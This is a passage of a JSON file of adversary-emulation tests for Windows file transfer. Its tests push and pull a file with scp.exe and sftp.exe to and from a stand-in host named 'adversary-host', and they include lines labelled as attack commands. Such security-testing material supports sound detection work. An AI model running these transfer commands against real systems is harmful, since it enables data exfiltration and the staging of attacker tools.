                        "description": "This test simulates pushing files using SCP on a Windows environment.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "remote_path": {
                                "description": "Path of folder to copy",
                                "type": "path",
                                "default": "/tmp/"
                            },
                            "remote_host": {
                                "description": "Remote host to send",
                                "type": "string",
                                "default": "adversary-host"
                            },
                            "local_path": {
                                "description": "Local path to copy from",
                                "type": "path",
                                "default": "C:\\temp"
                            },
                            "file_name": {
                                "description": "Name of the file to transfer",
                                "type": "string",
                                "default": "T1105.txt"
                            },
                            "username": {
                                "description": "User account to authenticate on remote host",
                                "type": "string",
                                "default": "adversary"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "This test requires the `scp` command to be available on the system.\n",
                                "prereq_command": "if (Get-Command scp -ErrorAction SilentlyContinue) {\n    Write-Output \"SCP command is available.\"\n    exit 0\n} else {\n    Write-Output \"SCP command is not available.\"\n    exit 1\n}\n",
                                "get_prereq_command": "# Define the capability name for OpenSSH Client\n$capabilityName = \"OpenSSH.Client~~~~0.0.1.0\"\ntry {\n    # Install the OpenSSH Client capability\n    Add-WindowsCapability -Online -Name $capabilityName -ErrorAction Stop\n    Write-Host \"OpenSSH Client has been successfully installed.\" -ForegroundColor Green\n} catch {\n    # Handle any errors that occur during the installation process\n    Write-Host \"An error occurred while installing OpenSSH Client: $_\" -ForegroundColor Red\n}\n"
                            }
                        ],
                        "executor": {
                            "elevation_required": true,
                            "name": "powershell",
                            "command": "# Check if the folder exists, create it if it doesn't\n$folderPath = \"#{local_path}\"\nif (-Not (Test-Path -Path $folderPath)) {\n    New-Item -Path $folderPath -ItemType Directory\n}\n\n# Create the file\n$filePath = Join-Path -Path $folderPath -ChildPath \"#{file_name}\"\nNew-Item -Path $filePath -ItemType File -Force\nWrite-Output \"File created: $filePath\"\n\n# Attack command\nscp.exe #{local_path}\\#{file_name} #{username}@#{remote_host}:#{remote_path}\n",
                            "cleanup_command": "$filePath = Join-Path -Path \"#{local_path}\" -ChildPath \"#{file_name}\"\nRemove-Item -Path $filePath -Force -erroraction silentlycontinue\nWrite-Output \"File deleted: $filePath\"\n"
                        }
                    },
                    {
                        "name": "Windows pull file using scp.exe",
                        "auto_generated_guid": "401667dc-05a6-4da0-a2a7-acfe4819559c",
                        "description": "This test simulates pulling files using SCP on a Windows environment.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "remote_path": {
                                "description": "Path of folder to pull",
                                "type": "path",
                                "default": "/tmp/T1105.txt"
                            },
                            "remote_host": {
                                "description": "Remote host to pull from",
                                "type": "string",
                                "default": "adversary-host"
                            },
                            "local_path": {
                                "description": "Local path to receive files",
                                "type": "path",
                                "default": "C:\\temp"
                            },
                            "username": {
                                "description": "User account to authenticate on remote host",
                                "type": "string",
                                "default": "adversary"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "This test requires the `scp` command to be available on the system.\n",
                                "prereq_command": "if (Get-Command scp -ErrorAction SilentlyContinue) {\n    Write-Output \"SCP command is available.\"\n    exit 0\n} else {\n    Write-Output \"SCP command is not available.\"\n    exit 1\n}\n",
                                "get_prereq_command": "# Define the capability name for OpenSSH Client\n$capabilityName = \"OpenSSH.Client~~~~0.0.1.0\"\ntry {\n    # Install the OpenSSH Client capability\n    Add-WindowsCapability -Online -Name $capabilityName -ErrorAction Stop\n    Write-Host \"OpenSSH Client has been successfully installed.\" -ForegroundColor Green\n} catch {\n    # Handle any errors that occur during the installation process\n    Write-Host \"An error occurred while installing OpenSSH Client: $_\" -ForegroundColor Red\n}\n"
                            }
                        ],
                        "executor": {
                            "elevation_required": true,
                            "name": "powershell",
                            "command": "scp.exe #{username}@#{remote_host}:#{remote_path} #{local_path}\n"
                        }
                    },
                    {
                        "name": "Windows push file using sftp.exe",
                        "auto_generated_guid": "205e676e-0401-4bae-83a5-94b8c5daeb22",
                        "description": "This test simulates pushing files using SFTP on a Windows environment.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "remote_path": {
                                "description": "Path of folder to copy",
                                "type": "path",
                                "default": "/tmp"
                            },
                            "remote_host": {
                                "description": "Remote host to send",
                                "type": "string",
                                "default": "adversary-host"
                            },
                            "local_path": {
                                "description": "Local path to receive sftp",
                                "type": "path",
                                "default": "C:\\temp"
                            },
                            "file_name": {
                                "description": "Name of the file to transfer",
                                "type": "string",
                                "default": "T1105.txt"
                            },
                            "username": {
                                "description": "User account to authenticate on remote host",
                                "type": "string",
                                "default": "adversary"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "This test requires the `sftp` command to be available on the system.\n",
                                "prereq_command": "if (Get-Command sftp -ErrorAction SilentlyContinue) {\n    Write-Output \"SFTP command is available.\"\n    exit 0\n} else {\n    Write-Output \"SFTP command is not available.\"\n    exit 1\n}\n",
                                "get_prereq_command": "# Define the capability name for OpenSSH Client\n$capabilityName = \"OpenSSH.Client~~~~0.0.1.0\"\ntry {\n    # Install the OpenSSH Client capability\n    Add-WindowsCapability -Online -Name $capabilityName -ErrorAction Stop\n    Write-Host \"OpenSSH Client has been successfully installed.\" -ForegroundColor Green\n} catch {\n    # Handle any errors that occur during the installation process\n    Write-Host \"An error occurred while installing OpenSSH Client: $_\" -ForegroundColor Red\n}\n"
                            }
                        ],
                        "executor": {
                            "elevation_required": true,
                            "name": "powershell",
                            "command": "# Check if the folder exists, create it if it doesn't\n$folderPath = \"#{local_path}\"\nif (-Not (Test-Path -Path $folderPath)) {\n    New-Item -Path $folderPath -ItemType Directory\n}\n# Create the file\n$filePath = Join-Path -Path $folderPath -ChildPath \"#{file_name}\"\nNew-Item -Path $filePath -ItemType File -Force\nWrite-Output \"File created: $filePath\"\n# Attack command\necho \"put #{local_path}\\#{file_name}\" | sftp #{username}@#{remote_host}:#{remote_path}\n",
                            "cleanup_command": "$filePath = Join-Path -Path \"#{local_path}\" -ChildPath \"#{file_name}\"\nRemove-Item -Path $filePath -Force\nWrite-Output \"File deleted: $filePath\"\n"
                        }
                    },
                    {
                        "name": "Windows pull file using sftp.exe",
                        "auto_generated_guid": "3d25f1f2-55cb-4a41-a523-d17ad4cfba19",
                        "description": "This test simulates pulling files using SFTP on a Windows environment.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "remote_path": {
                                "description": "Path of file to pull",
                                "type": "path",
                                "default": "/tmp/T1105.txt"
                            },
                            "remote_host": {
                                "description": "Remote host to pull from",
                                "type": "string",
                                "default": "adversary-host"
                            },
                            "local_path": {
                                "description": "Local path to receive files",
                                "type": "path",
                                "default": "C:\\temp"
                            },
                            "username": {
                                "description": "User account to authenticate on remote host",
                                "type": "string",
                                "default": "adversary"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "This test requires the `sftp` command to be available on the system.\n",
                                "prereq_command": "if (Get-Command sftp -ErrorAction SilentlyContinue) {\n    Write-Output \"SFTP command is available.\"\n    exit 0\n} else {\n    Write-Output \"SFTP command is not available.\"\n    exit 1\n}\n",
                                "get_prereq_command": "# Define the capability name for OpenSSH Client\n$capabilityName = \"OpenSSH.Client~~~~0.0.1.0\"\ntry {\n    # Install the OpenSSH Client capability\n    Add-WindowsCapability -Online -Name $capabilityName -ErrorAction Stop\n    Write-Host \"OpenSSH Client has been successfully installed.\" -ForegroundColor Green\n} catch {\n    # Handle any errors that occur during the installation process\n    Write-Host \"An error occurred while installing OpenSSH Client: $_\" -ForegroundColor Red\n}\n"
                            }
                        ],
                        "executor": {
                            "elevation_required": true,
                            "name": "powershell",
                            "command": "sftp.exe #{username}@#{remote_host}:#{remote_path} #{local_path}"
                        }
                    }
                ]
            }
        ]
    },
    "timestamp": "2025-02-28 12:59:00"
}